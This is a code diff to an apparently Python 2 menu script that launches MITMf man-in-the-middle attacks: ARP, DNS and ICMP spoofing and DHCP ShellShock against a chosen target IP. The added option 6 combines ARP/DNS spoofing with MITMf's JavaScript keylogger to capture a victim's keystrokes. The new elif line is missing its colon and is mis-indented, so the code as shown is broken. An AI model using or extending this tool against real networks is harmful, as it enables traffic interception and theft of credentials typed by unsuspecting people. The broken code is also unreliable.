@@ -27,7 +27,7 @@ def WriteMenuOptions():
 	print"	|_______________________________________|"
 	print"	|1. Arp-Spoof   	2. Arp-Reply-Spoof  |"
 	print"	|3. Browser-Profile 4. DHCP-ShellShock  |"
-	print"	|5. ICMP-Spoof                      	|"
+	print"	|5. ICMP-Spoof      6.Arp w/Keylogger   |"
 	print"	|_______________________________________|"
 	return
     
@@ -87,6 +87,8 @@ while True:
 	elif menuOption=="5":
     	os.system("mitmf -i "+interface+" --spoof --icmp --gateway "+gateway+" --target "+ip)
     	break
+    	elif menuOption=="6"
+    	os.system("mitmf -i "+interface+" --arp --dns --spoof --gateway "+gateway+" --target "+ip+" --jskeylogger")
 	else:
     	whileLoopBool=False
     	print"Invalid Selection slick, Try again, and get it right this time."
